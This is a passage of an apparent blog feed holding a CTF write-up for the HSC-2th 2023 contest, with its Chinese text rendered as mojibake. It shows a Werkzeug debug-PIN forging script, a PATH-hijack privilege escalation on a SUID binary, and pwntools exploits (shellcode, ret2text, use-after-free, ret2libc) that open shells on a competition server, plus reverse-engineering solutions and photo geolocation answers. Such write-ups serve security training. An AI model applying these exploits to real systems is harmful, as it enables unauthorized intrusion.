class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &gt;=3.8 sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;0242ac0208fe&#x27;</span>,<span class="number">16</span>)),<span class="comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/1/mountinfo</span></span><br><span class="line">    <span class="string">&#x27;7265fe765262551a676151a24c02b7b6&#x27;</span>+<span class="string">&#x27;bcf34bfb0be38980dddd4de1d57a8b7da2de7843ee55ed110016b97f5163406c&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>è¾“å…¥PINç è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç° <code>/flag</code> å’Œ <code>/readflag</code>ï¼Œ<code>/flag</code> æ— æƒé™è¯»ï¼Œè€Œ <code>/readflag</code> æœ‰SUIDæƒé™ï¼Œéœ€è¦ææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo \&quot;/bin/bash\&quot;&gt;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /</span><br><span class="line">./readflag</span><br></pre></td></tr></table></figure><p>è¾“å…¥ <code>print(os.popen(&quot;cd /tmp;echo \&quot;/bin/bash\&quot;&gt;ps;chmod 777 ps;echo $PATH;export PATH=/tmp:$PATH;cd /;./readflag&quot;).read())</code> å¾—flagã€‚</p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="DECOMPILEONEOONE"><a href="#DECOMPILEONEOONE" class="headerlink" title="DECOMPILEONEOONE"></a>DECOMPILEONEOONE</h3><p>ç…§ä»£ç é€»è¾‘è¿˜åŸå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x5C797E8971697066</span>,<span class="number">0x8D83497D7F6F7A3D</span>,<span class="number">0x949DA8758277A9A5</span>,<span class="number">0xB7954D7C</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    <span class="keyword">if</span> (i&amp;<span class="number">1</span>)!=<span class="number">0</span>:</span><br><span class="line">        cc[i] = cc[i]+i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cc[i] = cc[i]+i</span><br><span class="line">    cc[i] ^= i + <span class="number">1</span></span><br><span class="line">    cc[i] -= <span class="number">3</span> * i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;reV3rSe_1s_sucH_hanD1e&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Whack-a-mole"><a href="#Whack-a-mole" class="headerlink" title="Whack-a-mole"></a>Whack-a-mole</h3><p>åŠ¨è°ƒè¿‡åè°ƒè¯•å’Œä¸­é—´çš„åˆ¤æ–­æ¡ä»¶ï¼Œä½¿å¾—æµç¨‹èµ°å‘æ­£ç¡®çš„å¤„ç†å‡½æ•°é‡Œï¼Œæœ€ååœ¨ <code>Source</code> å­—ç¬¦ä¸²ä¸­æŸ¥çœ‹åˆ°å·²ä¿®æ”¹å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼š<code>w1n32_aP</code> å’Œ <code>i_iS_FUn</code>ï¼Œè¿æ¥å¾—flagï¼š<code>flag&#123;w1n32_aPi_iS_FUn&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Base-secrets"><a href="#Base-secrets" class="headerlink" title="Base secrets"></a>Base secrets</h3><p>rustç¨‹åºï¼Œæ¯”è¾ƒéš¾çœ‹ï¼Œç»“åˆé¢˜ç›® <code>Base</code> è·Ÿè¸ªä¸€ä¸‹ä»£ç é€»è¾‘ï¼Œå‘ç°ç¼–ç åçš„å­—ç¬¦ä¸² <code>hexZh3tyVXM3X2AwX35yM+IxRU1nkz5nmWdzhXdF7Qo=</code>ã€‚</p><p>è·Ÿè¿›åˆ°encodeä»£ç éƒ¨åˆ†ï¼Œæå–å‡ºç è¡¨ä¸º <code>456789+-IJKLMNOPQRSTUVWXghijklmnYZabcdefopqrstuvwxyz0123ABCDEFGH</code>ï¼Œ</p><p>base64è§£ç å¾—flagï¼š<code>flag&#123;rUs7_n0_pr0b1EM_s0_yisey&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h3><p>ç®€å•ret2shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10059</span>)</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.sh()).ljust(<span class="number">0x110</span>,<span class="string">&#x27;a&#x27;</span>)+p64(buf2)+p64(buf2)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Morris-II"><a href="#Morris-II" class="headerlink" title="Morris II"></a>Morris II</h3><p>åœ¨ <code>main() -&gt; fight_system() -&gt; confirm_input() -&gt; read()</code> ä¸­å‘ç°æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œæœ‰backdoorï¼Œå†ret2textå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10396</span>)</span><br><span class="line"></span><br><span class="line">dontlookatme=<span class="number">0x401236</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;from belowï¼š&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;hero\&#x27;s name!:\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)+p64(dontlookatme)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EasyHeap"><a href="#EasyHeap" class="headerlink" title="EasyHeap"></a>EasyHeap</h3><p>ç±»ä¼¼<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">ctf-wikiçš„hacknote</a>ï¼ŒUAFèœå•é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10575</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x80495BD</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># show note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Safe-Program"><a href="#Safe-Program" class="headerlink" title="Safe Program"></a>Safe Program</h3><p>ret2libcï¼Œéœ€è¦æ ¹æ®æ³„éœ²åœ°å€æŸ¥è¯¢libcä¸ºlibc-2.31ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10914</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401391</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">main=<span class="number">0x401247</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h2><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>å›¾ç‰‡ä¿¡æ¯æœ‰é˜¿å‹’æ³°å¸‚ç¬¬åä¸‰å±Šå…ƒå®µç¯ä¼šï¼Œæœç´¢åˆ°ä¸¾åŠåœ°ä¸ºäº”ç™¾é‡Œé£æƒ…è¡—ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚</p><p><code>HSCSEC&#123;æ–°ç–†ç»´å¾å°”è‡ªæ²»åŒºé˜¿å‹’æ³°åœ°åŒºé˜¿å‹’æ³°å¸‚äº”ç™¾é‡Œé£æƒ…è¡—&#125;</code></p><p>â€‹    </p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p>æ”¾å¤§å›¾ç‰‡å‘ç°å®å¤ç†å·¥å­¦é™¢ï¼Œæœç´¢å®å¤ç†å·¥å­¦é™¢é™„è¿‘çš„æ¹–ä¸ºæ˜Ÿæµ·æ¹–ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚</p><p><code>HSCSEC&#123;å®å¤å›æ—è‡ªæ²»åŒºçŸ³å˜´å±±å¸‚å¤§æ­¦å£åŒºæ˜Ÿæµ·æ¹–&#125;</code></p><p>â€‹    </p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p>ç™¾åº¦è¯†å›¾ï¼Œæœåˆ°åœ°ç‚¹ä¸ºappleå®˜æ–¹(è¥¿å•å¤§æ‚¦åŸåº—)ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚</p><p><code>HSCSEC&#123;åŒ—äº¬å¸‚è¥¿åŸåŒºè¥¿å•åŒ—å¤§è¡—131å·&#125;</code></p><p>â€‹    </p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p>ç™¾åº¦è¯†å›¾ï¼Œæœåˆ°æ–°é—»ï¼š<a href="https://www.sohu.com/a/540130745_121365332">ååŒ—æœ€å¤§çš„æ¹¿åœ°å…¬å›­ä½äºç¢§æ¡‚å›­å®˜å…è“åŒ—ä¾§ äº”ä¸€å‡æœŸæ¥è¿™é‡Œç©æ°´ä¹˜å‡‰ çœ‹æµ·æ£ èŠ±å§</a>ï¼Œå¾—åˆ°å…¬å›­åï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚</p><p><code>HSCSEC&#123;æ²³åŒ—çœå¼ å®¶å£å¸‚æ€€æ¥å¿å®˜å…æ°´åº“å›½å®¶æ¹¿åœ°å…¬å›­&#125;</code></p><p>â€‹    </p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>ç™¾åº¦è¯†å›¾å®šä½æ­å·è¥¿æ¹–ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚</p><p><code>HSCSEC&#123;æµ™æ±Ÿçœæ­å·å¸‚è¥¿æ¹–åŒºé¾™äº•è·¯1å·&#125;</code></p><p>â€‹    </p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p>é£æœºå›¾ç‰‡é‡Œä¿¡æ¯æœ‰B-30ELå‹å·ï¼Œæœç´¢åˆ°æ–°é—»ï¼š<a href="https://baijiahao.baidu.com/s?id=1685764680862717493&amp;wfr=spider&amp;for=pc">åˆå¤šäº†ä¸€ä¸ªä¸­å‹èˆªç©ºå…¬å¸ é‡åº†èˆªç©ºç¬¬30æ¶é£æœºå…¥åˆ—</a>ï¼Œé‡Œé¢æåˆ° <code>æ¸å…´å¿«çº¿</code>ï¼Œå†æ ¹æ®åœ°é¢æœºåœºç‰¹å¾ï¼Œä¸åœ°å›¾æ¯”å¯¹ï¼Œä¸ºåŒ—äº¬å¤§å…´å›½é™…æœºåœºã€‚</p><p><code>HSCSEC&#123;åŒ—äº¬å¸‚å¤§å…´åŒºå¤§å…´å›½é™…æœºåœº&#125;</code></p><p>â€‹    </p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>ç™¾åº¦è¯†å›¾ä¸ºæ¾³é—¨åŸƒè²å°”é“å¡”ï¼Œåœ¨åœ°å›¾æœå…·ä½“åœ°å€ï¼Œå¤šæ¬¡å°è¯•æ‰æ­£ç¡®ã€‚</p><p><code>HSCSEC&#123;æ¾³é—¨ç‰¹åˆ«è¡Œæ”¿åŒºè·¯æ°¹å¡«æµ·åŒºæ¾³é—¨è·¯æ°¹é‡‘å…‰å¤§é“è¿è´¯å…¬è·¯æ¾³é—¨å·´é»äºº&#125;</code></p><p>â€‹    </p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p>ä¸€çœ¼é‡åº†ç´¢é“ï¼Œæ ¹æ®ç´¢é“å’Œå¤§æ¡¥çš„è§†è§’ï¼Œåœ¨åœ°å›¾ä¸Šæ‰¾åˆ°å¤§è‡´èŒƒå›´ï¼Œåœ¨åˆ©ç”¨åœ°å›¾3Dæ¨¡å¼ï¼Œå‘ç°é è¿‘æ±Ÿè¾¹çš„æ¥¼æœ€é«˜ï¼Œåªå¯èƒ½åœ¨è¿™æ ‹æ¥¼é‡Œï¼Œå¦åˆ™æŒ¡è§†çº¿ã€‚æ¥¼é‡Œæœ‰æ ‡æ³¨ç€å±±ä»€é›†ï¼Œåœ¨ç¾å›¢ä¸Šä¹Ÿèƒ½çœ‹åˆ°ç±»ä¼¼å›¾ç‰‡çš„åˆ†äº«ï¼Œå°è¯•è¯¥å…·ä½“åœ°å€æˆåŠŸã€‚</p><p><code>HSCSEC&#123;é‡åº†å¸‚æ¸ä¸­åŒºç™½è±¡å±…4å·æ¥¼9-1å·&#125;</code></p><p>â€‹    </p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p>å›¾ç‰‡æ¯”è¾ƒæ¨¡ç³Šï¼Œæ”¾å¤§æŸ¥çœ‹æ¶ˆé˜²å‘˜è¡£æœèƒŒåå­—æ ·ï¼ŒçŒœæµ‹å‡ºç”˜è‚ƒæ¶ˆé˜²ï¼Œå†æœç´¢ <code>ç”˜è‚ƒ ç„°ç«</code>ï¼Œçœ‹åˆ°æ–°é—»ï¼š<a href="https://www.liuyangfc.com/news/18130.html">ç”˜è‚ƒçœç™½é“¶å¸‚å‡Œç©ºé€ å‡ºä¸¤åº§â€ç«ç„°å±±â€ï¼Œæµé˜³ä¸­æ´²çƒŸèŠ±é›†å›¢5.5ä¸‡å‘é«˜ç©ºç¤¼èŠ±é—ªè€€å…ƒå®µå¤œ</a>ï¼Œæ–°é—»ä¸­æœ‰æå…¶ç›¸ä¼¼çš„ç…§ç‰‡ï¼›åœ°ç‚¹ä¸ºç™½é“¶åŸåŒºé‡‘å²­å…¬å›­ï¼Œå†åœ¨åœ°å›¾æœå…·ä½“åœ°å€ã€‚</p><p><code>HSCSEC&#123;ç”˜è‚ƒçœç™½é“¶å¸‚ç™½é“¶åŒºé‡‘å²­å…¬å›­&#125;</code></p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8&lt;/p&gt;
&lt;p&gt;æœ¬å±ŠHSC-2th 2023æ˜¯ç”±ä¸­é¾™æŠ€æœ¯è”åˆç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHSCSECï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–we</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 4</title>
    <link href="https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/"/>
    <id>https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/</id>
    <published>2023-02-06T13:43:16.000Z</published>
    <updated>2023-02-07T12:07:47.828Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)<br>çº¿ä¸Šèµ›å¹³å°ï¼š<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>è¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­<br>æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€<br>æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼š<br>ç¬¬1åï¼š1000Pwnhubé‡‘å¸<br>ç¬¬2åï¼š800Pwnhubé‡‘å¸<br>ç¬¬3åï¼š600Pwnhubé‡‘å¸<br>4-10åï¼š300Pwnhubé‡‘å¸<br>è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ª<br>æ³¨æ„ï¼š<br>* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›<br>* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº<br>* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚<br>* HGAME 